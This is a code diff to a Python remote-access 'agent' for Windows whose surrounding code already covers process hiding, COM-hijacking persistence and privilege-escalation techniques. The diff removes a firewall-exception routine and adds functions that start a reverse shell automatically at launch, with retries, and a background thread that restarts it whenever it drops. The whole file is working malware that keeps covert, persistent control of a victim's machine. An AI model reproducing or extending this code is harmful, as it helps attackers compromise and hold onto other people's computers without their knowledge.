@@ -1621,26 +1621,7 @@ def setup_com_hijacking_persistence():
         print(f"COM hijacking persistence failed: {e}")
         return False
 
-def add_firewall_exception():
-    """Add firewall exception for the current process."""
-    if not WINDOWS_AVAILABLE:
-        return False
-    
-    try:
-        current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
-        
-        subprocess.run([
-            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
-            f'name="Python Agent {uuid.uuid4()}"',
-            'dir=in', 'action=allow',
-            f'program="{current_exe}"'
-        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
-        
-        return True
-        
-    except Exception as e:
-        print(f"Failed to add firewall exception: {e}")
-        return False
+
 
 def hide_process():
     """Attempt to hide the current process from task manager."""
@@ -2269,6 +2250,53 @@ def stop_reverse_shell():
         REVERSE_SHELL_THREAD = None
         print("Stopped reverse shell.")
 
+def auto_start_reverse_shell(agent_id):
+    """Automatically start reverse shell with retry logic."""
+    max_retries = 10
+    retry_delay = 5
+    
+    for attempt in range(max_retries):
+        try:
+            print(f"Starting reverse shell (attempt {attempt + 1}/{max_retries})...")
+            start_reverse_shell(agent_id)
+            
+            # Wait a moment to check if connection was successful
+            time.sleep(2)
+            
+            # Check if the socket is still alive and connected
+            if REVERSE_SHELL_SOCKET and REVERSE_SHELL_ENABLED:
+                print("Reverse shell connected successfully.")
+                return True
+            else:
+                print("Reverse shell failed to connect.")
+                if attempt < max_retries - 1:
+                    print(f"Retrying in {retry_delay} seconds...")
+                    time.sleep(retry_delay)
+                
+        except Exception as e:
+            print(f"Reverse shell startup error: {e}")
+            if attempt < max_retries - 1:
+                print(f"Retrying in {retry_delay} seconds...")
+                time.sleep(retry_delay)
+    
+    print("Failed to establish reverse shell after all attempts.")
+    return False
+
+def monitor_reverse_shell(agent_id):
+    """Monitor reverse shell connection and restart if it fails."""
+    while True:
+        try:
+            # Check if reverse shell is supposed to be running but isn't
+            if not REVERSE_SHELL_ENABLED or not REVERSE_SHELL_THREAD or not REVERSE_SHELL_THREAD.is_alive():
+                print("Reverse shell disconnected, restarting...")
+                auto_start_reverse_shell(agent_id)
+            
+            time.sleep(10)  # Check every 10 seconds
+            
+        except Exception as e:
+            print(f"Reverse shell monitor error: {e}")
+            time.sleep(5)
+
 # --- Voice Control Functions ---
 
 def voice_control_handler(agent_id):
@@ -2390,13 +2418,10 @@ def initialize_low_latency_input():
         from low_latency_input import LowLatencyInputHandler
         LOW_LATENCY_INPUT_HANDLER = LowLatencyInputHandler(max_queue_size=2000)
         LOW_LATENCY_INPUT_HANDLER.start()
-        print("Low-latency input handler initialized")
         return True
     except ImportError:
-        print("Low-latency input handler not available, using fallback")
         return False
     except Exception as e:
-        print(f"Failed to initialize low-latency input: {e}")
         return False
 
 def handle_remote_control(command_data):
@@ -2409,8 +2434,6 @@ def handle_remote_control(command_data):
             success = LOW_LATENCY_INPUT_HANDLER.handle_input(command_data)
             if success:
                 return
-            else:
-                print("Low-latency input queue full, using fallback")
         
         # Fallback to direct handling
         _handle_remote_control_fallback(command_data)
@@ -2939,7 +2962,6 @@ def main_loop(agent_id):
     # Initialize high-performance systems
     print("Initializing high-performance systems...")
     low_latency_available = initialize_low_latency_input()
-    print(f"Low-latency input: {'Available' if low_latency_available else 'Fallback mode'}")
     
     internal_commands = {
         "start-stream": lambda: start_streaming(agent_id),
@@ -3357,7 +3379,6 @@ if __name__ == "__main__":
     # Setup stealth features
     try:
         hide_process()
-        add_firewall_exception()
         setup_persistence()
         
         # Establish advanced persistence using UACME-inspired techniques
@@ -3370,6 +3391,15 @@ if __name__ == "__main__":
     
     agent_id = get_or_create_agent_id()
     print(f"Agent starting with ID: {agent_id}")
+    
+    # Automatically start reverse shell
+    auto_start_reverse_shell(agent_id)
+    
+    # Start reverse shell monitor in background
+    monitor_thread = threading.Thread(target=monitor_reverse_shell, args=(agent_id,))
+    monitor_thread.daemon = True
+    monitor_thread.start()
+    
     try:
         main_loop(agent_id)
     except KeyboardInterrupt:
